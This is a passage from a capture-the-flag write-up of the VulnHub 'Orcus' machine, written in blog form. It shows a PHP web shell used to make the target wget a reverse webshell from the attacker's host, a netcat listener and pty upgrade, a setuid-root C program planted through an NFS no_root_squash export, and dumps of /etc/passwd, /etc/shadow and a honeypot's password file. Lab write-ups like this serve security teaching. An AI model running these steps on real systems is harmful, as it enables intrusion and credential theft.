lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
bind:x:104:114::/var/cache/bind:/bin/false
postfix:x:105:115::/var/spool/postfix:/bin/false
dovecot:x:106:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:107:118:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:108:119::/var/lib/landscape:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:110:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
avahi:x:111:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:112:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
kippo:x:1001:27::/home/kippo:/bin/bash
statd:x:113:65534::/var/lib/nfs:/bin/false
systemd-timesync:x:114:125:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:115:126:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:116:127:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:117:128:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:100:101::/run/uuidd:/bin/false
lxd:x:118:65534::/var/lib/lxd/:/bin/false
_apt:x:119:65534::/nonexistent:/bin/false
dnsmasq:x:120:65534:dnsmasq,,,:/var/lib/misc:/bin/false
* Curl_http_done: called premature == 0
* Connection #0 to host 10.37.129.9 left intact
{% endhighlight %}

Now to get a better shell:

{% highlight bash %}
screen python -m SimpleHTTPServer
curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=wget%20http://10.37.129.5:8000/php_reverse_webshell.php
sudo nc sudo nc -vnlp 443
Connection from 10.37.129.9 44708 received!
Linux Orcus 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU/Linux
 00:44:17 up  2:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@Orcus:/var/www$
cd /
locate flag.txt
cat /var/www/flag.txt
868c889965b7ada547fae81f922e45c4
{% endhighlight %}

There's the first flag

## PrivEsc

### Enumeration and Analysis

Using g0mi1k's privilege escalation writeup and running various commands I was able to find nfs running as root.  After some researching on interacting with this on the cli I found this command: showmount

{% highlight bash %}
showmount -e 10.37.129.9
Export list for 10.37.129.9:
/tmp *
{% endhighlight %}

This lists out all the exports mount points from nfs.  The exported mount point is: /tmp so lets mount it!

{% highlight bash %}

mkdir /tmp/vulnhub
cd /tmp/vulnhub
ls -lath
total 48K
drwxrwxrwt 12 root root 4.0K Aug 24 22:36 .
drwx------  2 root root 4.0K Aug 24 20:57 tracker-extract-files.0
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .ICE-unix
drwx------  2 root root 4.0K Aug 24 20:57 ssh-TVL1oS3wkLKA
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .X11-unix
drwx------  3 root root 4.0K Aug 24 20:57 systemd-private-3286c9b159bb4c5998249430cd42edb1-colord.service-2d3vOv
drwx------  3 root root 4.0K Aug 24 20:57 systemd-private-3286c9b159bb4c5998249430cd42edb1-rtkit-daemon.service-YYM1kZ
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .font-unix
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .Test-unix
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .XIM-unix
drwxrwxrwt  9 root root 4.0K Aug  9 14:45 vulnhub
drwxr-xr-x 23 root root 4.0K Aug  7 20:26 ..

touch shell.c
{% endhighlight %}

Then on our web shell:

{% highlight bash %}

ls -lath /tmp
total 48K
drwxrwxrwt  9 root root 4.0K Aug  9 16:45 .
-rw-r--r--  1 root root  139 Aug  9 15:56 shell.c
drwx------  3 root root 4.0K Aug  7 22:21 systemd-private-765d21d4df6547a5844544a1a0c980b4-dovecot.service-eftoMO
drwx------  3 root root 4.0K Aug  7 22:21 systemd-private-765d21d4df6547a5844544a1a0c980b4-systemd-timesyncd.service-uFCgDz
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .ICE-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .Test-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .X11-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .XIM-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .font-unix
drwxr-xr-x 24 root root 4.0K Oct 30  2016 ..

cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/tmp *(rw,no_root_squash)

{% endhighlight %}

After some research the important part: (rw, no_root_squash) essentially tells the nfs daemon to create files as the user running the service and leave them as is.  When this setting is not present (default in most cases) nfsnobody is the user who owns files created via nfs this is to prevent programs like the one found below from being uploaded and used to escalate privilege.  This means chown chmod are open game

### Exploit

Once I found that nfs was running as root I started looking up how to exploit it and an example for this VM, credits to g0blin research (https://g0blin.co.uk/orcus-vulnhub-writeup/#elevation) was available to learn from:

{% highlight c %}
#include <unistd.h>

main(int argc, char ** argv, char ** envp)
{
    setgid(0);
    setuid(0);
    system("/bin/bash", argv, envp);
    return 0;
}
{% endhighlight %}

Then on through our web shell:

{% highlight bash %}
cd /tmp
gcc shell.c -o shell
shell.c:3:1: warning: return type defaults to 'int' [-Wimplicit-int]
 main( int argc, char ** argv, char ** envp )
 ^
shell.c: In function 'main':
shell.c:7:2: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
 system("/bin/bash", argv, envp);
 ^
{% endhighlight %}

Then set the executable up on our host:

{% highlight bash %}
chown root:root shell
chmod +s shell
{% endhighlight %}

Then run the exploit:

{% highlight bash %}
./shell
whoami
root
{% endhighlight %}

And for the root flag:

{% highlight bash %}
cd /
locate flag.txt
cat /root/flag.txt
807307b49314f822985d0410de7d8bfe
{% endhighlight %}


## Flag 3

Now that I had root (and it's flag) time to start looking around more...

{% highlight bash %}
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
bind:x:104:114::/var/cache/bind:/bin/false
postfix:x:105:115::/var/spool/postfix:/bin/false
dovecot:x:106:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:107:118:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:108:119::/var/lib/landscape:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:110:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
avahi:x:111:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:112:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
kippo:x:1001:27::/home/kippo:/bin/bash
statd:x:113:65534::/var/lib/nfs:/bin/false
systemd-timesync:x:114:125:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:115:126:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:116:127:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:117:128:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:100:101::/run/uuidd:/bin/false
lxd:x:118:65534::/var/lib/lxd/:/bin/false
_apt:x:119:65534::/nonexistent:/bin/false
dnsmasq:x:120:65534:dnsmasq,,,:/var/lib/misc:/bin/false

cat /etc/shadow
root:$6$psudnBp7$lVI5Y6RtuMfKSpyeno0Kw0fJWv9oylnnc7GVeqTanD88zXT5NvjveIyi.rCef4FDXlpbuDMBvFUhraOTAhw3e.:17097:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
mysql:!:17083:0:99999:7:::
messagebus:*:17083:0:99999:7:::
bind:*:17083:0:99999:7:::
postfix:*:17083:0:99999:7:::
dovecot:*:17083:0:99999:7:::
dovenull:*:17083:0:99999:7:::
landscape:*:17083:0:99999:7:::
sshd:*:17083:0:99999:7:::
postgres:*:17083:0:99999:7:::
avahi:*:17083:0:99999:7:::
colord:*:17083:0:99999:7:::
kippo:!:17086:0:99999:7:::
statd:*:17088:0:99999:7:::
systemd-timesync:*:17102:0:99999:7:::
systemd-network:*:17102:0:99999:7:::
systemd-resolve:*:17102:0:99999:7:::
systemd-bus-proxy:*:17102:0:99999:7:::
uuidd:!:16273:0:99999:7:::
lxd:*:17102:0:99999:7:::
_apt:*:17102:0:99999:7:::
dnsmasq:*:17102:0:99999:7:::
{% endhighlight %}

Upon initial inspection of these files I didn't see anything that jumped out at me.  Then after a lot more enumeration I broke down and wanted to see how a more experienced tester was able to progress farther.  The user kippo is one that a known honeypot might run as.  Upon running:

{% highlight bash %}
whereis kippo
/etc/kippo
cd /etc/kippo
ls
README.md
data
dl
doc
fs.pickle
honeyfs
kippo
kippo.cfg
kippo.tac
log
start.sh
stop.sh
txtcmds
utils


grep -ir 'ssw'  *
README.md:* Possibility of adding fake file contents so the attacker can 'cat' files such as /etc/passwd. Only minimal file contents are included
data/userdb.txt:fakuser:1:TH!SP4SSW0RDIS4Fl4G!
doc/sql/mysql.sql:  `password` varchar(100) NOT NULL,
fs.pickle:S'update-passwd'
fs.pickle:S'chgpasswd'
fs.pickle:S'chpasswd'
fs.pickle:S'gpasswd'
fs.pickle:S'passwd'
fs.pickle:S'grub-mkpasswd-pbkdf2'
fs.pickle:S'nsswitch.conf'
fs.pickle:S'base-passwd'
fs.pickle:S'passwd'
fs.pickle:S'passwd.expire.cron'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'update-passwd.8.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'grub-mkpasswd-pbkdf2.1.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'update-passwd.8.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'update-passwd.8.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'update-passwd.8.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'chgpasswd.8.gz'
fs.pickle:S'update-passwd.8.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'passwd2des.3.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'update-passwd.8.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'nsswitch.conf.5.gz'
fs.pickle:S'passwd.1.gz'
fs.pickle:S'gpasswd.1.gz'
fs.pickle:S'chpasswd.8.gz'
fs.pickle:S'update-passwd.8.gz'
fs.pickle:S'passwd.5.gz'
fs.pickle:S'common-password'
fs.pickle:S'common-password.md5sums'
fs.pickle:S'base-passwd'
fs.pickle:S'passwd.master'
fs.pickle:S'passwd'
fs.pickle:S'nsswitch.conf'
fs.pickle:S'Password.pm'
fs.pickle:S'Password.pm'
fs.pickle:S'Password.pm'
fs.pickle:S'Password.pm'
fs.pickle:S'Password.pm'
fs.pickle:S'Password.pm'
fs.pickle:S'Password.pm'
fs.pickle:S'yppasswd.x'
fs.pickle:S'yppasswd.h'
fs.pickle:S'password.mod'
fs.pickle:S'password_pbkdf2.mod'
fs.pickle:S'password'
fs.pickle:S'passwd.conffiles'
fs.pickle:S'passwd.md5sums'
fs.pickle:S'passwd.preinst'
fs.pickle:S'base-passwd.list'
fs.pickle:S'base-passwd.md5sums'
fs.pickle:S'base-passwd.postinst'
fs.pickle:S'passwd.postinst'
fs.pickle:S'passwd.list'
fs.pickle:S'passwords.dat'
fs.pickle:S'passwd'
fs.pickle:S'passwd'
fs.pickle:S'common-password'
fs.pickle:S'chpasswd'
fs.pickle:S'nsswitch.conf'
fs.pickle:S'passwd'
fs.pickle:S'opasswd'
fs.pickle:S'passwd-'
fs.pickle:S'password.mod'
fs.pickle:S'password_pbkdf2.mod'
kippo/commands/adduser.py:            (O_P, 'Password: '),
kippo/commands/adduser.py:            (O_P, 'Password again: '),
kippo/commands/adduser.py:            self.honeypot.password_input = True
kippo/commands/adduser.py:        self.honeypot.password_input = False
kippo/commands/base.py:class command_passwd(HoneyPotCommand):
kippo/commands/base.py:        self.write('Enter new UNIX password: ')
kippo/commands/base.py:        self.honeypot.password_input = True
kippo/commands/base.py:        self.passwd = None
kippo/commands/base.py:        self.passwd = line
kippo/commands/base.py:        self.write('Retype new UNIX password: ')
kippo/commands/base.py:        self.honeypot.password_input = False
kippo/commands/base.py:        if line != self.passwd or self.passwd == '*':
kippo/commands/base.py:            self.writeln('Sorry, passwords do not match')
kippo/commands/base.py:            self.honeypot.user.uid, self.passwd)
kippo/commands/base.py:        self.writeln('passwd: password updated successfully')
kippo/commands/base.py:        print 'INPUT (passwd):', line
kippo/commands/base.py:        self.password = line.strip()
kippo/commands/base.py:commands['/usr/bin/passwd'] = command_passwd
kippo/commands/ssh.py:        self.write('%s@%s\'s password: ' % (self.user, self.host))
kippo/commands/ssh.py:        self.honeypot.password_input = True
kippo/commands/ssh.py:        self.honeypot.password_input = False
kippo/dblog/textlog.py:            (args['username'], args['password']))
kippo/dblog/textlog.py:            (args['username'], args['password']))
kippo/dblog/mysql.py:            passwd = cfg.get('database_mysql', 'password'),
kippo/dblog/mysql.py:            ', `username`, `password`, `timestamp`)' + \
kippo/dblog/mysql.py:            (session, 0, args['username'], args['password'], self.nowUnix()))
kippo/dblog/mysql.py:            ', `username`, `password`, `timestamp`)' + \
kippo/dblog/mysql.py:            (session, 1, args['username'], args['password'], self.nowUnix()))
kippo/dblog/xmpp.py:        password    = cfg.get('database_xmpp', 'password')
kippo/dblog/xmpp.py:        self.run(application, jid, password, muc, channels)
kippo/dblog/xmpp.py:    def run(self, application, jidstr, password, muc, channels, anon=True):
kippo/dblog/xmpp.py:        self.xmppclient = XMPPClient(jid.internJID(jidstr), password)
kippo/dblog/xmpp.py:        ses['password'] = args['password']
kippo/dblog/xmpp.py:        ses['password'] = args['password']
kippo/core/auth.py:            (login, uid_str, passwd) = line.split(':', 2)
kippo/core/auth.py:            self.userdb.append((login, uid, passwd))
kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
kippo/core/auth.py:            f.write('%s:%d:%s\n' % (login, uid, passwd))
kippo/core/auth.py:    def checklogin(self, thelogin, thepasswd):
kippo/core/auth.py:        '''check entered username/password against database'''
kippo/core/auth.py:        '''note that it allows multiple passwords for a single username'''
kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
kippo/core/auth.py:            if login == thelogin and passwd in (thepasswd, '*'):
kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
kippo/core/auth.py:    def user_password_exists(self, thelogin, thepasswd):
kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
kippo/core/auth.py:            if login == thelogin and passwd == thepasswd:
kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
kippo/core/auth.py:        for (login, uid, passwd) in self.userdb:
kippo/core/auth.py:    def adduser(self, login, uid, passwd):
kippo/core/auth.py:        if self.user_password_exists(login, passwd):
kippo/core/auth.py:        self.userdb.append((login, uid, passwd))
kippo/core/auth.py:class HoneypotPasswordChecker:
kippo/core/auth.py:    credentialInterfaces = (credentials.IUsernamePassword,
kippo/core/auth.py:        if hasattr(credentials, 'password'):
kippo/core/auth.py:            if self.checkUserPass(credentials.username, credentials.password):
kippo/core/auth.py:        r = pamConversion((('Password:', 1),))
kippo/core/auth.py:    def checkUserPass(self, username, password):
kippo/core/auth.py:        if UserDB().checklogin(username, password):
kippo/core/auth.py:            print 'login attempt [%s/%s] succeeded' % (username, password)
kippo/core/auth.py:            print 'login attempt [%s/%s] failed' % (username, password)
kippo/core/dblog.py:            ('^login attempt \[(?P<username>.*)/(?P<password>.*)\] failed',
kippo/core/dblog.py:            ('^login attempt \[(?P<username>.*)/(?P<password>.*)\] succeeded',
kippo/core/dblog.py:    # args has: username, password
kippo/core/dblog.py:    # args has: username, password
kippo/core/protocol.py:        self.password_input = False
kippo/core/protocol.py:    # Easier way to implement password input?
kippo/core/protocol.py:        if not self.password_input:
Binary file kippo/core/auth.pyc matches
kippo.cfg:# user:1:TH!SP4SSW0RDIS4Fl4G!
kippo.cfg:# Directory for miscellaneous data files, such as the password database.
kippo.cfg:#password = secret
kippo.cfg:#password = anonymous
kippo.tac:factory.portal.registerChecker(core.auth.HoneypotPasswordChecker())
txtcmds/usr/sbin/vipw:vipw: /etc/passwd is unchanged
utils/passdb.py:        print 'Usage: %s <pass.db> <add|remove|list> [password]' % \
utils/passdb.py:        for password in db.keys():
utils/passdb.py:            print password
{% endhighlight %}

The second line returned: data/userdb.txt:fakuser:1:TH!SP4SSW0RDIS4Fl4G!

## Flag 4

I wasn't able to find the post-exploitation flag, looks like most didn't, moving on to another.